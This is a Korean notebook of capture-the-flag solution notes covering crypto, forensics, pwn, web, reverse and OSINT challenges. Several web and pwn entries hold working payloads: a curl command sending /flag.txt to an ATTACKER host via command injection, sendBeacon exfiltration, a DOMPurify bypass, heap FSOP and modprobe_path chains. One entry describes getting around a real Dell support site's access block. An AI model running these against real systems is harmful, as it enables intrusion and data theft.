# War Stories — 특수 사례 기록

유사 패턴이 인식될 때 참조하는 특수 사례 모음. 각 항목은 특정 문제/플랫폼에서만 적용되는 경험이다.

---

## Crypto 특수 사례

### Dreamhack singlerand — Python MT19937 seed preimage under 4300 decimal digits

`random.Random(int(input()))`처럼 seed가 정수이고 Python 3.11+ 기본 `int` 변환 제한(4300 decimal digits)이 걸리면,
MT state 전체 624-word seed를 그대로 넣지 말고 446개의 32-bit word seed를 목표로 잡는다.

핵심 포인트:
- 첫 396개 `getrandbits(32)`의 합이 0이면 각 출력이 모두 0이어야 한다.
- twist 후 `T[0..395]=0`이 되도록 seed 직후 state `S`를 구성한다.
  - `S[228..395]=0`
  - `S[227]` MSB = 0
  - `S[396]` low 31 bits = 0
  - `S[397+i]=twist_mix(S[i], S[i+1])`
- CPython `init_by_array()` 두 번째 루프를 역산할 때 `B[2]`는 `S[1]`이 아니라 이미 복구한 `B[1]`을 참조한다.
  ```python
  B[1] = (S[1] + 1) ^ G2(S[623])
  B[2] = (S[2] + 2) ^ G2(B[1])
  B[i] = (S[i] + i) ^ G2(S[i-1])  # i >= 3
  ```
- 446-word seed에서는 first-loop에서 key `0..177` 일부가 재사용되므로 중복 key 식이 일치해야 한다.
- 자유 변수로 `S[2..52]`를 잡고 `S[53..227]`을 구성하면 마지막 32-bit residual 하나만 남는다. 이 residual을 랜덤/로컬 탐색으로 0으로 만들면 4300자리 제한 안의 seed를 얻을 수 있다.

실전 결과:
- 446-word seed의 10진수 길이: 4297자리
- 검증: `random.Random(seed)`의 첫 396개 `getrandbits(32)` 합이 0

## Forensics/Misc 특수 사례

### CoreXY plotter traffic + microphone side-channel

CoreXY 펜 플로터 로그가 `OP|SQ|DT|AM|BM` 같은 모션 필드만 주고 pen up/down을 숨기는 경우:

1. 먼저 모터 델타를 표준 CoreXY로 복원한다.
   - `dx = (AM + BM) / 2`
   - `dy = (AM - BM) / 2`
   - 큰 음수 `dx` + `dy=1`은 다음 래스터 행으로 돌아가는 scanline 구분자인 경우가 많다.
2. setup/config 패킷에 있는 작은 정수들을 치수로 의심한다.
   - 예: `0x003b, 0x0008, 0x0006` -> 59글자, 8/6 픽셀 글꼴 단서.
3. 각 scanline을 6px 고정폭 cell로 나누고, 알려진 flag prefix로 glyph fingerprint를 매핑한다.
   - 부분 feature만으로는 `c/o`처럼 같은 fingerprint가 충돌할 수 있으니 prefix와 반복 문자 일관성으로 해소한다.
   - unknown 부분은 같은 cell fingerprint가 같은 문자여야 한다는 제약을 먼저 적용한 뒤 자연어/문제 문맥으로 보정한다.
4. 오디오는 move type 후보를 검증하는 보조 신호로 사용한다.
   - command window별 FFT/RMS를 뽑아 `DT`/move pattern별 평균을 제거하면 pen contact 후보가 보인다.
   - 완전한 OCR보다 `known prefix -> cell fingerprint -> 반복 문자`가 더 빠를 수 있다.

HackTheon 2026 plottergeist에서는 setup 값 `59,8,6`과 6px cell fingerprint를 이용해
`hacktheon2026{the_plotter_reveals_its_secret_through_sound}`를 복원했다.

## Pwn 특수 사례

### HackTheon 2026 afterimage — preview history UAF + stdout FSOP

구조:
1. 서비스는 한 연결 안에서 preview history 4개를 유지한다.
2. 업로드 처리 중 먼저 가장 유사한 previous record를 고르고, 이후 history가 꽉 찼으면 oldest record를 free한다.
3. `A,B,C,D,A` 순서로 넣으면 마지막 `A`에서 previous와 eviction 대상이 첫 번째 `A`로 같아져 UAF가 발생한다.
4. 작은 record는 `0x220` tcache chunk이고, freed chunk metadata가 download PNG 하단 row에 섞인다.
5. current 이미지 첫 8픽셀이 post-UAF `memmove`로 freed previous chunk fd를 덮어 tcache poisoning이 된다.

실전 포인트:
- `row254[:8]`이 `chunk >> 12`로 보이면 heap safe-linking key leak이다.
- libc leak은 large record를 previous로 선택시키되 current는 small로 둬서 unsorted-bin fd/bk를 post-UAF write로 깨지 않게 한다. 이 문제에서는 heap leak 이후 small warm-up 1개 뒤 `L,B,C,D,S`가 안정적이었다.
- leak 값이 `0x4c4c4c4c...`, `0x47474747...`, `0x212121...`이면 libc pointer가 아니라 이미지 prefix/payload이므로 FSOP로 넘어가지 않는다.
- 최종은 `target = _IO_2_1_stdout_`, `encoded_fd = target ^ (poison_chunk >> 12)`로 0x220 tcache poisoning을 만든 뒤 fake FILE을 stdout에 복사했다.
- glibc 2.39 기준 `_IO_wfile_jumps` House-of-Apple2 경로에서 fake FILE 시작 문자열을 `true;cat flag\x00`로 두면 `puts("upload ok")` 시점에 `system(fp)`가 호출되어 flag가 먼저 출력된다.
- poison chunk offset과 final current record offset은 같다고 가정하지 않는다. 이번 exploit에서는 heap page 기준 `poison-off=-0x1f40`, `fake-off=0x3250`, trigger previous slot 2 고정이 원격에서 맞았다.

### Hidden `modprobe_path` + direct-map alias 복구

커널 pwn에서 `modprobe_path` 심볼이 `/proc/kallsyms`에 안 보이고, `free_modprobe_argv` 같은 근처 심볼만 보일 때는 둘 중 하나로 빠르게 복구한다.

1. 먼저 공개 심볼 앵커를 찾는다.
   `free_modprobe_argv`처럼 이름이 남아 있으면 그 오프셋에서 `modprobe_path`까지의 정적 delta를 로컬 `vmlinux`로 계산한다.
2. 그 경로가 원격에서 실패하면, 임의 읽기로 누출한 `kmalloc-*` 포인터를 direct map 기준점으로 쓴다.
   `ffff88..` 형태의 heap/direct-map 포인터가 하나라도 있으면:
   - `dm_base = leaked_ptr & ~0x1fffffff`
   - 로컬 `vmlinux`에서 `"/sbin/modprobe"`의 file offset -> virtual offset을 미리 계산
   - candidate = `dm_base + phys_base_guess + string_offset_in_image`
   - `phys_base_guess`는 2MB step으로 몇 개만 찍어도 맞는 경우가 많다.

실전 포인트:
- 문자열 전체를 블라인드 스캔하지 말고, 로컬 ELF에서 구한 `"/sbin/modprobe"` 위치를 기준으로 direct-map 별칭 후보만 읽는 편이 훨씬 안정적이다.
- `modprobe_path` 자체 심볼이 숨겨져 있어도 문자열 내용은 그대로 남아 있는 경우가 많다.
- `AAR/AAW`가 이미 성립했다면 `commit_creds`보다 `modprobe_path` overwrite가 더 짧고 KPTI/SMEP/SMAP 영향을 덜 받는다.

### Control slot / access slot 분리

`note->data = H`로 만든 fake note 경로에서는 제어 슬롯과 실제 AAR/AAW 슬롯을 분리해서 생각해야 한다.

- control slot:
  `WRITE(victim)`가 fake note header `H` 자체를 덮는 채널
- access slot:
  OOB raw slot 값이 `H`로 해석되어 `READ/WRITE`가 `H->data`를 따라가는 채널

실수 패턴:
- victim slot 하나만 가지고 곧바로 AAR/AAW를 하려고 하면 `READ(M)`가 `H->data`를 읽는다고 착각하기 쉽다.
- 실제로는 `READ(M)`는 `M.data`가 가리키는 note struct의 raw bytes를 읽는 단계일 뿐이고, arbitrary address read/write는 별도의 access slot이 필요하다.

---

## Web 특수 사례

### Dreamhack Anyone can cook — CSP meta refresh token leak + CSPT JSON XSS

구조:
1. `/recipe`는 CSP가 있지만 recipe `ingredients`를 `innerHTML`로 렌더링하고, admin이면 delete form에 admin JWT hidden input을 붙인다.
2. inline event/script는 CSP로 막히지만 `meta http-equiv=refresh` top navigation은 허용된다.
3. `ingredients`에서 single-quote dangling meta refresh를 열고, `steps`에 `'`를 넣어 delete form 뒤에서 닫으면 admin JWT가 webhook URL에 실린다.
4. `/api/recipe/update`는 현재 세션 role이 아니라 body의 admin JWT만 검증해 임의 recipe와 upload JSON을 unsanitized 값으로 수정한다.
5. `/user?id=`는 서버에서 `parseInt()`로 유저 존재만 확인하고, 클라이언트는 raw id를 `/api/recipes/user/` 뒤에 붙여 fetch한다. `id=<uid>/../../../../uploads/<file>.json`로 CSPT가 된다.
6. `/user`는 CSP가 없고 JSON `name`을 `innerHTML`에 넣어 최종 XSS로 `FLAG` 쿠키를 회수한다.

핵심 payload:
```html
ingredients = </pre><meta http-equiv=refresh content='0;url=https://webhook.site/<uuid>?tok=
steps = '
```

주의:
- dangling quote를 닫지 않으면 meta element 자체가 생성되지 않아 요청이 안 나갈 수 있다.
- 중간 form markup이 double quote만 쓰는지 확인하고 quote 종류를 고른다.
- upload JSON에는 `ingredients` 원본이 남지만 `/user` sink는 `name`만 쓰므로, admin token으로 update를 먼저 성공시켜야 했다.

### Dreamhack PublicDocs — CDT wrong-dictionary mXSS

구조:
1. `/doc/<id>/<ver>`가 `Use-As-Dictionary: id=<dict_id>, match="/doc/<id>/*"`를 내려줌
2. `dict_id`가 `title`에서 만들어져 structured-header injection 가능
3. 서버는 `Dictionary-ID`가 캐시에 있으면 그 body로 압축하지만, `Available-Dictionary` hash와 실제 body 일치 여부는 검증하지 않음
4. 그래서 브라우저는 공격자 버전 B1을 victim id로 저장하고, 서버는 victim 문서 A로 B2를 압축하게 만들 수 있음
5. 잘 맞는 title/content 조합에서는 sanitized markdown이 wrong decompression 후 `<a href="javascript:...">` + `autofocus onfocus=...`로 변형되어 실행됨

실전 값:
- victim dictionary title: `AAAAAE`
- B1 title:
  `",id="dict-<A_DOC>-AAAAAE-v1",a="x`
- B1 content:
  `[x](java "autofocus onfocus=location=href//")`
- B2 title:
  `script:(async()=>navigator.sendBeacon('//callback',await(await fetch('/admin')).text()))()//`

핵심 포인트:
- victim dictionary A는 bot보다 먼저 직접 요청해서 서버 캐시를 워밍해야 했다.
- 같은 origin에 쓰기 가능한 sink가 없어도 `navigator.sendBeacon('//callback', ...)`로 외부 회수가 더 짧고 안정적이었다.
- 길고 복잡한 `fetch('/edit/...',{method:'POST',...})` 페이로드는 decompression drift로 속성 경계가 깨졌고, 짧은 beacon payload는 안정적으로 `href` 안에 남았다.

### Dreamhack Go Through Me — user-panel bot -> admin-app Automad RCE

구조:
1. `user-panel` report bot가 `localhost:80`과 `http://admin-app/dashboard/login` 둘 다 로그인
2. `user-panel` XSS에서 `window.open('http://admin-app/_resize?url=...')`를 사용하면 **admin-app 세션이 실린 상태로** `_resize`를 때릴 수 있음
3. `_resize`는 외부 URL의 내용을 `admin-app/cache/downloads/<name>.<crc>`에 저장
4. 같은 팝업을 `w.location = 'http://admin-app/cache/downloads/<cache>'`로 재탑승시키면, 캐시 파일이 HTML 스니핑되어 admin-app origin JS로 실행될 수 있음

Automad RCE 포인트:
- `/_api/package-manager/add-repository`
- `PackageManagerController::addRepository()` -> `Composer->run("require {$name}:dev-{$branch}")`
- `Composer::run()`이 Composer API 경로에서 예외가 나면 `exec("$php $this->pharPath $command 2>&1", ...)` fallback으로 내려감
- `name`/`branch`가 쉘 이스케이프 없이 삽입되므로 `--badopt; <cmd> #` 형태로 명령 주입 가능

실전 페이로드:
```js
let d = new FormData();
d.append('__csrf__', csrf);
d.append('__json__', JSON.stringify({
  name: 'psr/log --badopt; curl -skG --data-urlencode x@/flag.txt https://ATTACKER/flag #',
  repositoryUrl: 'https://ATTACKER/group/project',
  platform: 'gitlab',
  branch: 'master'
}));
fetch('/_api/package-manager/add-repository', { method: 'POST', body: d });
```

주의:
- `github` adapter는 빈 `Authorization: token ` 헤더 때문에 public API도 `401` 날 수 있다. fake repo는 `gitlab` adapter로 맞추는 편이 안정적.
- 외부 carrier는 `payload.html`보다 **짧은 확장자 없는 경로**가 안전했다. 일부 public tunnel은 `.html` 경로를 자체 페이지로 가로챌 수 있다.
- 첫 `window.open()`만 user gesture로 허용되고, `setTimeout(() => open(...))`는 팝업 차단에 걸릴 수 있다. 후속 단계는 새 `open()`보다 **기존 창 `location` 재지정**이 안정적.

### Dell 지원 사이트 원본 사양 우회

Dell 서비스 태그가 보이는데 `ReviewSpecs/GetOriginalConfiguration`가 403이면 export 엔드포인트를 먼저 본다.

패턴:
1. `/support/home/<lang-country>` 방문
2. `/support/productsmfe/<lang-country>/productdetails?selection=<TAG>&assettype=svctag...` 로 세션 워밍
3. `POST /support/product-details/<lang-country>/reviewspecs/export/<TAG>`
4. 헤더에 `X-Requested-With: XMLHttpRequest`, `Origin`, `Referer` 추가

결과:
- `GetOriginalConfiguration`은 Akamai에 막혀도 export는 원본 구성 CSV를 주는 경우가 있다.
- CSV에서 `DIMM`, `Solid State Drive`, `HDD`, `M.2`, `TOSHIBA`, `SAMSUNG` 같은 라인을 grep하면 RAM/SSD 모델을 바로 복원할 수 있다.

### mXSS (Mutation XSS) — DOMPurify 2.0.8

sanitizer 통과 후 브라우저 DOM 삽입 시 XSS 발생. sanitizer 파서(예: JSDOM)와 브라우저 파서(Chrome)의 해석 차이가 원인.

**DOMPurify 2.0.8 + JSDOM 16.3.0 bypass 벡터:**
```html
<math><mtext><table><mglyph><style><!--</style><img src=x title="--><img src=x onerror=PAYLOAD>">
```

원리:
- JSDOM: `<style>` in MathML = raw text → `<!--`을 CSS 주석으로 처리 → 전체를 안전한 `<img title="...">` 하나로 sanitize 통과
- Chrome 86: `<style>` in mglyph = foreign element (raw text 아님) → `<!--`을 HTML 주석으로 처리 → `-->`까지 주석 처리 → 이후 `<img onerror=PAYLOAD>`가 실제 태그로 파싱 → XSS 발화

조건:
- DOMPurify ≤ 2.0.8 (`mglyph`이 ALLOWED_TAGS에 포함)
- Node.js 서버사이드에서 JSDOM 기반으로 DOMPurify 실행
- 실제 렌더링: Chrome 계열 브라우저의 innerHTML

버전 확인: JS 번들에서 `@license DOMPurify` 주석 검색
패치 버전: DOMPurify 2.1.0+ (`mglyph` ALLOWED_TAGS 제거)

### Differential Checker Oracle

서로 다른 백엔드 응답을 비교하는 checker가 있고, `requests`/fetcher가 **absolute-form request target**과 redirect-follow를 그대로 처리하면 파일 오라클로 바꿀 수 있다.

체크리스트:
1. raw request line에 `GET http://attacker/... HTTP/1.1` 절대형 target 넣기
2. 한쪽 백엔드는 `../../a`를 파일로 읽고, 다른 쪽은 `/a/` redirect가 나는 구조 찾기
3. redirect 대상은 bore.pub 같은 raw TCP 터널로 받기 (`cloudflared`는 `..` 경로를 400으로 막을 수 있음)
4. `Range: bytes=i-i`를 같이 보내서 비교 대상을 1바이트로 축소
5. 콜백 서버는 후보 1바이트만 응답하게 해서 `Responses match`/`do not match`로 brute-force

예시:
```http
GET http://bore.pub:PORT/%2e%2e/%2e%2e/a?x=f HTTP/1.1
Host: victim
Range: bytes=10-10
```

### SSRF via axios isAbsoluteURL + Vue Router

axios의 `isAbsoluteURL` 정규식: `/^([a-z][a-z\d\+\-\.]*:)?\/\//i`
scheme이 **optional**이라 `///hostname/path`도 absolute URL로 인식 → baseURL 무시 → 브라우저가 protocol-relative로 처리 → `http://hostname/path` 외부 요청 발생.

Vue Router SPA에서 `%2F` 인코딩으로 trigger 가능:
```
report URL: /#/%2F%2Fevil.com%2Fitem/detail
  → Vue Router params.id = "//evil.com/item"
  → axios.get("/" + "//evil.com/item" + "/info") = "///evil.com/item/info"
  → isAbsoluteURL("///evil.com/item/info") = true
  → 브라우저: http://evil.com/item/info 요청 (SSRF)
```

서버 측 `//` 포함 체크도 우회됨 (`%2F%2F`는 리터럴 `//` 아님).

### nginx ingress RCE
- CVE-2025-24514 + CVE-2025-1974 체이닝
- auth-url 인젝션 페이로드: `}}}` 블록 탈출

### Dreamhack edge-gate
- gate 앱이 `probe`를 정규식으로 먼저 검사하고, 그 뒤 `url.QueryUnescape`를 수행했다.
- 그래서 raw newline/`;`는 막혀도 `%0A`, `%3B`, `%7D`, `%23`로 인코딩하면 admission webhook까지 살아 들어갔다.
- 실전 페이로드 형태:
  `http://example.com/#%3B%7D%7D%7D%0A%0Assl_engine%20../../../../../../proc/<pid>/fd/<fd>%3B%0A%0A`
- 로컬 검증은 blob 업로드 브루트포스 전에 direct path로 분리해서 확인하는 게 빠르다:
  `ssl_engine ../../../../../../mnt/share/payload.so;`
- remote gate는 요청마다 내부에서 hold를 5초 유지하므로 직렬 브루트포스가 아니라 병렬 PID/FD 탐색이 필요했다.
- 실제 원격 히트: `pid=22`, `fd=25`

### ETag Length Leak (PortSwigger Top 10 2025)
- Cross-origin 길이 오라클 → 바이너리 서치
- false positive 방지: 두 번 confirm (`!c1 || !c2`)
- Promise.all 병렬화 시 타이밍 주의

### CI/CD SSRF
- 내부 메타데이터 엔드포인트 탐색
- bore.pub + DNS rebinding 조합

---

## Crypto 특수 사례

### GF(256) Sage API 함정

최신 Sage에서 GF(256) 원소 변환 시 구 API가 없는 경우 있음:

```python
# 구 API (일부 Sage 버전에서 AttributeError)
F.fetch_int(n)              # → AttributeError
e.integer_representation()  # → AttributeError

# 대체 API
F.from_integer(int(n))      # 정수 → GF(256) 원소
def to_int(e):              # GF(256) 원소 → 정수
    poly = e.polynomial()
    coeffs = poly.coefficients(sparse=False)
    result = 0
    for i, c in enumerate(coeffs):
        if c == GF(2)(1): result |= (1 << i)
    return result
```

### Oil-and-Vinegar(UOV) 서명 위조 — Kipnis-Shamir 공격

공개키 m개의 n×n 행렬 P_k over GF(256)만으로 서명 위조:

```
핵심 흐름:
1. S_k = P_k + P_k^T (대칭화)
2. M = A⁻¹B (A,B = S_k의 랜덤 선형결합)
3. char_poly(M) 인수분해 → 1차 인수 (x-λ) 탐색 (약 50% 확률/시도)
4. 2-dim 고유공간 span{v1,v2}에서 α∈GF(256) 256회 탐색 → oil 벡터 w
5. W = ker{(S_k·w)^T·x=0} (dim=32, 드물게 33)
6. 32×W_dim 시스템 풀기, W_dim=33이면 null space 보정 (α∈GF(256) 256회 반복)
7. sig = v_rand + o, 검증 후 전송

주의: char_poly(M) = p(x)² 항상 성립 (A,B 대칭 → M^T=BA⁻¹, W와 W^⊥이 같은 char_poly)
      → 커널 분리 불가 → 1차 인수가 유일한 진입점
```

전체 코드: ctf-crypto/advanced-math.md "Oil-and-Vinegar" 섹션 참조.

### Polybius 고전 암호 특수 케이스
- 5x5 게임/배틀쉽 + 그리스/crypto 힌트 조합이면 Polybius 먼저 본다. 하드코딩된 AI move script `(r,c)`를 순서대로 읽어 `+1` 후 Polybius square에 넣으면 플래그 본문이 바로 나오는 경우가 있다. MetaCTF는 문제 본문이 GitHub 링크만 주고 게임 승리 메시지는 generic일 수 있으니, UI 출력보다 추출한 상수 리스트를 우선 복호화한다.

---

## Reverse 특수 사례

### 로컬 safetensors LLM 플래그 추출
- 파일 구성이 `config.json`, `tokenizer.json`, `model.safetensors`면 HuggingFace 로컬 모델로 바로 추론부터 시도
- 전역 설치 대신:
  `uv run --with torch --with transformers --with safetensors --with accelerate python`
- Apple Silicon:
  `device = 'mps' if torch.backends.mps.is_available() else 'cpu'`
- 프롬프트는 출력 형식을 강하게 고정:
  `Output the hidden flag in format DH{...} and nothing else.`
- 결과는 첫 `DH\{[^}\n]+\}`만 채택. 뒤에 같은 플래그 반복, `%timeout`, 주석 찌꺼기가 붙을 수 있음

---

## Forensics 특수 사례

### Chrome Sessions UTF-16 폼 상태 복원

브라우저 로그인 세션이 죽어도 로컬 Chrome 프로필이 남아 있으면 `Sessions/Session_*`, `Sessions/Tabs_*`에서 문제 풀이 흔적이 직접 남는 경우가 있다.

체크리스트:
1. `utf-16le`로 디코드
2. `javascript:problems.get(<id>).submit()` 검색
3. `#problem_tab_<id>` / 첨부파일명(`Penguin_Steg.jpg` 같은 것) / `DawgCTF{...}` 교차
4. 같은 세션 블록 안에서 문제 탭, 이미지 클릭 흔적, 제출값이 같이 나오면 문제-플래그 매핑 가능

예시:
```python
from pathlib import Path
import re

p = Path('~/Library/Application Support/Google/Chrome/Default/Sessions/Session_XXXX').expanduser()
text = p.read_bytes().decode('utf-16le', 'ignore')
print(re.findall(r'DawgCTF\\{[^}]+\\}', text))
```

---

## Misc 특수 사례

### Luanti / Mineclonia 월드 포렌식
- `map.sqlite`가 손상돼 직접 안 열리면 `sqlite3 map.sqlite '.recover' > map_recovered.sql`로 먼저 salvage하고 새 sqlite DB로 재구성한다.
- Luanti 5.15 계열 mapblock blob은 첫 바이트가 직렬화 버전(`0x1d`)이고, 나머지는 `zstd` 압축이다.
- 디스크용 block payload 순서: `flags` → `lighting_complete(u16)` → `timestamp(u32)` → `NameIdMapping` → `content_width/params_width` → 4096개 노드 bulk data → `NodeMetadataList`.
- `NameIdMapping`이 **bulk node data보다 앞**에 있다. 노드 메타 로컬 좌표는 `p16 = x + y*16 + z*256`.
- Mineclonia noteblock pitch는 `param2`, repeater 방향도 `param2 & 3`로 읽는다. note/repeater 체인을 따라간 결과만 보지 말고, wire가 직접 치는 note와 branch를 따로 반영해야 실제 재생 순서를 복원할 수 있다. 버튼/소스가 하나면 근처 체인만 따로 읽지 말고, 그 소스에서 도달 가능한 note event 전체를 시간순으로 합친 뒤 tap code를 해독해야 완전한 문장이 나온다.

### 원격 그래프/TSP 서비스
- 문제 문구가 `minimum tour distance`, 입력이 대칭 adjacency matrix면 거의 항상 `start로 되돌아오는 Hamiltonian cycle`이다. open path로 해석하지 말고 cycle 비용을 계산한다.
- `n=20` 정도에서는 파이썬 dict 기반 Held-Karp가 정답이어도 시간초과가 날 수 있다. 실전에서는 DP만 C++ flat array(`dp[mask*n + last]`)로 옮기고, 파이썬은 소켓 파싱과 입출력만 맡기는 구성이 가장 안전하다.
- 라운드별 제한시간이 빡빡하면 `정답이 틀린지`보다 `계산이 늦은지`를 먼저 의심한다.

### NES 오디오 노트 암호 (Beeps and Boops, DawgCTF 2026)
- NES(2A03) 펄스 채널로 생성된 WAV에서 note→character 매핑으로 플래그 추출하는 유형.
- **샘플레이트 2배 함정**: WAV가 22050Hz로 생성됐지만 헤더가 44100Hz → 모든 주파수가 1옥타브(2배) 높게 재생됨. 안정 노트의 주파수가 매핑의 정확히 2배인지 확인해서 판별.
- **NES 타이머 클램핑**: 11비트 타이머(max 2047) → 최저 주파수 = `1789773/(16×2048)` ≈ 54.62Hz. 이보다 낮은 노트(C0~G#0 → 'a'~'i')는 전부 동일 주파수로 클램핑되어 오디오만으로 구분 불가.
- 클램핑된 구간 판별: 여러 "갭 노트"가 정확히 같은 주파수(~54.6Hz, 주기 807샘플) → 모두 timer=2047.
- **해결법**: 클램핑 안 된 노트는 주파수로 정확히 디코딩, 클램핑된 자리는 문맥(영문 문구 + 플래그 포맷)으로 추론.
- 분석 순서: (1) 안정 구간 영점교차/FFT로 주파수 특정 (2) 갭 구간 긴 윈도우 분석 (3) 클램핑 여부 판별 (4) 옥타브 보정 (5) 문맥 복원

---

## OSINT 특수 사례

### HAZMAT 규정형 문제
- 방사성 물질 트레일러 사진에서 모델명(`UX-30`, `30B`, `F-96`)과 규정 분류(`TYPE B(U)`)를 분리해서 읽는다. 문제가 `container type`을 묻고 힌트가 `모델이 아니라 classification type`이라고 하면 답은 대개 규정 분류 쪽이다.
- 플래그 포맷에서 `package`, `fissile`, 인증번호 같은 부가어는 빼고 자연스러운 핵심만 남긴다.

### 전력용 현수 애자 사진 식별
- 10인치 안팎의 도자기 suspension insulator면 먼저 `ball/socket` vs `clevis/tongue`를 본다. 이걸로 ANSI `52-3/52-5` 계열과 `52-4/52-6` 계열이 빨리 갈린다.
- 흐린 각인은 전체를 다 읽으려 하지 말고 `10000 TEST`/`15000 TEST` 같은 proof-load 숫자와 `...840`, `...255` 같은 끝부분 substring만 챙긴다. 그 뒤 NIA shell profile + 제조사 카탈로그 cross-reference로 `20S840`, `30S255`, `5960A-70` 같은 모델 후보를 좁힌다.
- 사진에 `BALL TYPE` 또는 비슷한 기능 표기가 보이면 모델 직접 표기가 아니라 coupling clue일 가능성이 높다. 모델은 별도 카탈로그 번호일 수 있다.
